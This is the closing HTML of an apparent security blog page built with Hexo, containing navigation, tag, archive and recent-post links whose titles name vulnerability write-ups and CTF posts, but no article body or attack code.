+    <a href="/2019/12/02/ucms%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ucms后台代码执行漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/11/19/onethink1-0%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6getshell-%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">onethink1.0缓存文件getshell(复现)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
